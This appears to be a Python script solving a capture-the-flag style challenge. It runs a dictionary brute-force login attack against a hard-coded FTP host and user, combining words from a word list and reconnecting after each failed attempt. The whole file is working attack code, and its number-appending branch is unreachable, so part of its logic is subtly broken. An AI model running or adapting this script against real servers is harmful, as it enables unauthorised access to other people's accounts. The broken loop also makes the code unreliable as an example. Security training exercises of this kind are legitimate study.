import ftplib

#creating class because I need to put the variables somewhere where thry will actually work
#(thanks python 2.7.15, you're just great)
class VariableClass():
	global textFileContents
	global ftp

#establish fixed varialbes
cyberStartHost="services.cyberprotection.agency"
cyberStartPort=2121
cyberStartUsername="secure_user"
wordsTextFileLocation="words.txt"
amountOfWordsInPassword=1
maxNumValueToAdd=-1 #change to -1 for no numbers


#define all methods

#open the file with words in it and then save them in an array to the variable "textFileContains"
def OpenFileAndReadContents():
	file=open(wordsTextFileLocation,mode='r')
	VariableClass.textFileContents=file.read().splitlines()
	file.close()

#go through the amount of words to combine each time eg. all 1 words combinations, then all 2 word combinations, then all 3 word combinations etc
def GoThroughPasswordList():
	for i in range(1,amountOfWordsInPassword+1):
		if CreatePassword(i,"")==True:
			break
		
#create the password by embedding the method if necessary and adding numbers to the end of each password if necessary
#also if logging 
def CreatePassword(numberOfWords,currentPasswordParam):
	for possiblePassword in VariableClass.textFileContents:
		currentPassword=currentPasswordParam+possiblePassword
		if numberOfWords==1:
			#login without numbers
			print("Attempting Login...")
			if AttemptLoginToServer(currentPassword) == False:
				continue
			else:
				return True
			#login with numbers
			for i in range(0,maxNumValueToAdd+1):	
				print("Attempting Login...")
				if AttemptLoginToServer(currentPassword+str(i)) == False:
					continue
				else:
					return True
		else:
			if CreatePassword(numberOfWords-1,currentPassword)==True:
				return True
	return False

#attempt a login to the server and display an error if it fails
#also quit and then reconnect to the server each time to make sure there are no unexpected errors
def AttemptLoginToServer(password):
	try:
		VariableClass.ftp.login(user=cyberStartUsername,passwd=password)
	except Exception as e:
		print("Login to FTP with username "+str(cyberStartUsername)+" and password "+password+" failed")
		print(e)
		print("////////////////////////////////////////////////////////////////////////////////////")
		print("quitting...")
		while True:
			try:
				VariableClass.ftp.close()
			except Exception as e:
				print(e)
				continue
			break
		print("Reconnecting...")
		while True:
			try:
				VariableClass.ftp.connect(host=cyberStartHost,port=cyberStartPort,timeout=3)
			except Exception as e:
				print(e)
				continue
			break
		
		print("Connection To FTP with host "+str(cyberStartHost)+" and port "+str(cyberStartPort)+" succesfull")
		return False
	else:
		print("Login to FTP with username "+str(cyberStartUsername)+" and password "+password+" SUCCESFULL")
		return True

#read words text file and save contents
OpenFileAndReadContents()

#begin connection
VariableClass.ftp=ftplib.FTP(timeout=1)
print("FTP class established succesfully")

VariableClass.ftp.set_pasv(True)
print("FTP set to passsive succesfully")

VariableClass.ftp.connect(host=cyberStartHost,port=cyberStartPort,timeout=3)
print("Connection To FTP with host "+str(cyberStartHost)+" and port "+str(cyberStartPort)+" succesfull")

#Begin Login brute force attack
GoThroughPasswordList()



	


